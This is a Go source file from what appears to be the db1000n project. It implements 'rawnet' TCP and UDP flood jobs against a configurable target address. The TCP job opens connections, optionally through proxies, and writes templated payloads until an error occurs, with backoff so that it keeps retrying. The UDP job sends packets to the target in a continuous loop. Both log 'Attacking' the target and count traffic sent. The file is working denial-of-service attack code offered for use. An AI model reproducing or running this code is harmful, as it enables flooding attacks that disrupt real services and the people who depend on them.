// MIT License

// Copyright (c) [2022] [Bohdan Ivashko (https://github.com/Arriven)]

// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:

// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.

// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

package job

import (
	"context"
	"fmt"
	"log"
	"net"
	"strings"
	"text/template"
	"time"

	"github.com/google/uuid"
	"go.uber.org/zap"

	"github.com/Arriven/db1000n/src/core/packetgen"
	"github.com/Arriven/db1000n/src/job/config"
	"github.com/Arriven/db1000n/src/utils"
	"github.com/Arriven/db1000n/src/utils/metrics"
	"github.com/Arriven/db1000n/src/utils/templates"
)

type rawnetConfig struct {
	BasicJobConfig
	addr      string
	bodyTpl   *template.Template
	proxyURLs string
	timeout   time.Duration
}

func tcpJob(ctx context.Context, logger *zap.Logger, globalConfig *GlobalConfig, args config.Args) (data interface{}, err error) {
	ctx, cancel := context.WithCancel(ctx)
	defer cancel()

	jobConfig, err := parseRawNetJobArgs(ctx, logger, globalConfig, args)
	if err != nil {
		return nil, err
	}

	backoffController := utils.NewBackoffController(utils.NonNilBackoffConfigOrDefault(jobConfig.Backoff, globalConfig.Backoff))

	if globalConfig.ProxyURLs != "" {
		jobConfig.proxyURLs = templates.ParseAndExecute(logger, globalConfig.ProxyURLs, ctx)
	}

	trafficMonitor := metrics.Default.NewWriter(metrics.Traffic, uuid.New().String())
	go trafficMonitor.Update(ctx, time.Second)

	processedTrafficMonitor := metrics.Default.NewWriter(metrics.ProcessedTraffic, uuid.NewString())
	go processedTrafficMonitor.Update(ctx, time.Second)

	if !isInEncryptedContext(ctx) {
		log.Printf("Attacking %v", jobConfig.addr)
	}

	for jobConfig.Next(ctx) {
		err = sendTCP(ctx, logger, jobConfig, trafficMonitor, processedTrafficMonitor)
		if err != nil {
			utils.Sleep(ctx, backoffController.Increment().GetTimeout())
		} else {
			backoffController.Reset()
		}
	}

	return nil, nil
}

func sendTCP(ctx context.Context, logger *zap.Logger, jobConfig *rawnetConfig, trafficMonitor, processedTrafficMonitor *metrics.Writer) error {
	// track sending of SYN packet
	trafficMonitor.Add(packetgen.TCPHeaderSize + packetgen.IPHeaderSize)

	conn, err := utils.GetProxyFunc(jobConfig.proxyURLs, jobConfig.timeout)("tcp", jobConfig.addr)
	if err != nil {
		logger.Debug("error connecting via tcp", zap.String("addr", jobConfig.addr), zap.Error(err))
		metrics.IncRawnetTCP(jobConfig.addr, metrics.StatusFail)

		return err
	}

	defer conn.Close()

	// if we got here the connection was successful and thus we need to track SYN
	processedTrafficMonitor.Add(packetgen.TCPHeaderSize + packetgen.IPHeaderSize)

	// if we got here we had to also send ACK packet (and get a response)
	trafficMonitor.Add(packetgen.TCPHeaderSize + packetgen.IPHeaderSize)
	processedTrafficMonitor.Add(packetgen.TCPHeaderSize + packetgen.IPHeaderSize)

	// Write to conn until error
	for jobConfig.Next(ctx) {
		n, err := conn.Write([]byte(templates.Execute(logger, jobConfig.bodyTpl, ctx)))
		trafficMonitor.Add(uint64(n) + packetgen.TCPHeaderSize + packetgen.IPHeaderSize)

		if err != nil {
			metrics.IncRawnetTCP(jobConfig.addr, metrics.StatusFail)

			return err
		}

		processedTrafficMonitor.Add(uint64(n))
		metrics.IncRawnetTCP(jobConfig.addr, metrics.StatusSuccess)
	}

	return nil
}

func udpJob(ctx context.Context, logger *zap.Logger, globalConfig *GlobalConfig, args config.Args) (data interface{}, err error) {
	ctx, cancel := context.WithCancel(ctx)
	defer cancel()

	jobConfig, err := parseRawNetJobArgs(ctx, logger, globalConfig, args)
	if err != nil {
		return nil, err
	}

	udpAddr, err := net.ResolveUDPAddr("udp", jobConfig.addr)
	if err != nil {
		return nil, err
	}

	trafficMonitor := metrics.Default.NewWriter(metrics.Traffic, uuid.New().String())
	go trafficMonitor.Update(ctx, time.Second)

	if !isInEncryptedContext(ctx) {
		log.Printf("Attacking %v", jobConfig.addr)
	}

	conn, err := net.DialUDP("udp", nil, udpAddr)
	if err != nil {
		logger.Debug("error connecting via tcp", zap.Reflect("addr", udpAddr), zap.Error(err))
		metrics.IncRawnetUDP(udpAddr.String(), metrics.StatusFail)

		return nil, err
	}

	defer conn.Close()

	for jobConfig.Next(ctx) {
		sendUDP(ctx, logger, udpAddr, conn, jobConfig.bodyTpl, trafficMonitor)
	}

	return nil, nil
}

func sendUDP(ctx context.Context, logger *zap.Logger, a *net.UDPAddr, conn *net.UDPConn, bodyTpl *template.Template, trafficMonitor *metrics.Writer) {
	n, err := conn.Write([]byte(templates.Execute(logger, bodyTpl, ctx)))
	if err != nil {
		metrics.IncRawnetUDP(a.String(), metrics.StatusFail)

		return
	}

	trafficMonitor.Add(uint64(n) + packetgen.UDPHeaderSize + packetgen.IPHeaderSize)
	metrics.IncRawnetUDP(a.String(), metrics.StatusSuccess)
}

func parseRawNetJobArgs(ctx context.Context, logger *zap.Logger, globalConfig *GlobalConfig, args config.Args) (tpl *rawnetConfig, err error) {
	var jobConfig struct {
		BasicJobConfig

		Address   string
		Body      string
		ProxyURLs string
		Timeout   *time.Duration
	}

	if err := ParseConfig(&jobConfig, args, *globalConfig); err != nil {
		return nil, fmt.Errorf("error decoding rawnet job config: %w", err)
	}

	bodyTpl, err := templates.Parse(jobConfig.Body)
	if err != nil {
		return nil, fmt.Errorf("error parsing body template %q: %w", jobConfig.Body, err)
	}

	targetAddress := strings.TrimSpace(templates.ParseAndExecute(logger, jobConfig.Address, ctx))
	proxyURLs := templates.ParseAndExecute(logger, jobConfig.ProxyURLs, ctx)

	return &rawnetConfig{
		BasicJobConfig: jobConfig.BasicJobConfig,
		addr:           targetAddress,
		bodyTpl:        bodyTpl,
		proxyURLs:      proxyURLs,
		timeout:        utils.NonNilDurationOrDefault(jobConfig.Timeout, time.Minute),
	}, nil
}
